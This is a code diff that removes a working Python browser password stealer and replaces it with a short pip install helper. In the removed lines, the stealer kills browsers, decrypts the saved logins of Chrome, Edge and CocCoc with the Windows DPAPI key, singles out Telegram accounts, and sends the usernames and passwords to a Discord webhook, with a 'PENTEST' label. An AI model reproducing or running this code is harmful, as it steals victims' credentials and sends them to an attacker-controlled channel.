@@ -1,115 +1,17 @@
-### COMMAND_BLOCK ###
-import os, json, base64, sqlite3, shutil, requests, time, sys, traceback
-try:
-    import win32crypt
-    from Crypto.Cipher import AES
-    HAS_CRYPTO = True
-except:
-    HAS_CRYPTO = False; print("[-] No crypto libs")
+import subprocess
+import sys
 
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471173064002895986/8P_K4y-eq2O-wj8X6ks_i4jbKuk4p24E3RavZj_a8ZUiwva-9-ilAf2QSeRaJGK_PFvm"
-user_path = os.path.expanduser("~"); creds = []; telegram_creds = []
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-print("🔓 PENTEST: Browser Password Grabber")
+modules = ["requests"]
 
-def kill_browsers():
-    import psutil
-    killed = []
-    for p in psutil.process_iter(['name']):
-        if p.info['name'].lower() in ['chrome.exe', 'msedge.exe', 'firefox.exe', 'coc Coc.exe']:
-            try: p.kill(); killed.append(p.info['name'])
-            except: pass
-    print(f"[+] Killed: {killed}")
-
-def get_key(browser_dir):
-    if not HAS_CRYPTO: return None
+for m in modules:
     try:
-        state_path = os.path.join(user_path, "AppData", "Local", browser_dir, "User Data", "Local State")
-        if not os.path.exists(state_path): return None
-        with open(state_path, 'r', encoding='utf-8') as f:
-            data = json.load(f)
-        key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except: return None
+        __import__(m)
+        print(f"{m} đã có")
+    except ImportError:
+        print(f"Đang cài {m}...")
+        install(m)
 
-def decrypt(pwd, key):
-    try:
-        iv = pwd[3:15]; payload = pwd[15:]
-        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
-    except: return ""
-
-# KILL BROWSERS
-kill_browsers()
-
-# TARGET ALL POSSIBLE PATHS (FIXED)
-browser_configs = [
-    ("Chrome", ["Google\\Chrome", "Google/Chrome"]),
-    ("Edge", ["Microsoft\\Edge", "Microsoft/Edge"]),
-    ("CocCoc", ["CocCoc\\Browser", "CocCoc/Browser"])
-]
-
-for name, paths in browser_configs:
-    key = None
-    for path in paths:
-        key = get_key(path)
-        if key: break
-    
-    if not key:
-        print(f"[-] {name} no key")
-        continue
-    
-    db_path = os.path.join(user_path, "AppData", "Local", paths[0], "User Data", "Default", "Login Data")
-    print(f"[*] {name} DB: {db_path}")
-    
-    if not os.path.exists(db_path):
-        print(f"[-] {name} DB missing")
-        continue
-    
-    temp_db = f"temp_{name}.db"
-    try:
-        shutil.copy2(db_path, temp_db)
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
-        
-        count = 0
-        for url, user, pwd in cursor.fetchall():
-            if user and pwd:
-                password = decrypt(pwd, key)
-                if password:
-                    cred = {"browser": name, "url": url, "user": user, "pass": password}
-                    creds.append(cred)
-                    if "telegram" in url.lower() or "t.me" in url.lower():
-                        telegram_creds.append(cred)
-                    count += 1
-        
-        conn.close(); os.remove(temp_db)
-        print(f"[+] {name}: {count} creds")
-        
-    except Exception as e:
-        print(f"[-] {name} ERROR: {e}")
-
-print(f"\n🎉 TOTAL: {len(creds)} | Telegram: {len(telegram_creds)}")
-
-# IMMEDIATE DISCORD EXFIL
-summary = f"🔓 **{len(creds)} PASSWORDS** | Telegram: {len(telegram_creds)}"
-requests.post(DISCORD_WEBHOOK, json={"content": summary}).text
-
-# TOP 15 TO DISCORD
-top15 = creds[:15]
-preview = "\n".join([f"{c['browser']}: {c['url'].split('/')[2][:20]} | {c['user'][:15]} → {c['pass'][:20]}" for c in top15])
-requests.post(DISCORD_WEBHOOK, json={"content": f"`TOP 15:`\n```{preview}```"}).text
-
-# FULL BATCHES
-for i in range(0, len(creds), 15):
-    chunk = creds[i:i+15]
-    batch_msg = "\n".join([f"{c['url'][:35]} | {c['user'][:12]}:{c['pass'][:18]}" for c in chunk])
-    requests.post(DISCORD_WEBHOOK, json={"content": f"`Batch {i//15+1}/{len(creds)//15+1}`\n```{batch_msg}```"}).text
-    time.sleep(1)
-
-# LOCAL FILE
-with open(f"PENTEST_CREDS_{int(time.time())}.txt", "w", encoding="utf-8") as f:
-    f.write(f"PENTEST CREDS: {len(creds)} total\n\n")
-    for c in creds:
-        f.write(f"{c['browser']}: {c['url']} | {c['user']}:{c['pass']}\n")
-
-print("✅ **EXFIL COMPLETE** - Check Discord + PENTEST_CREDS_xxx.txt!")
+print("Xong!")
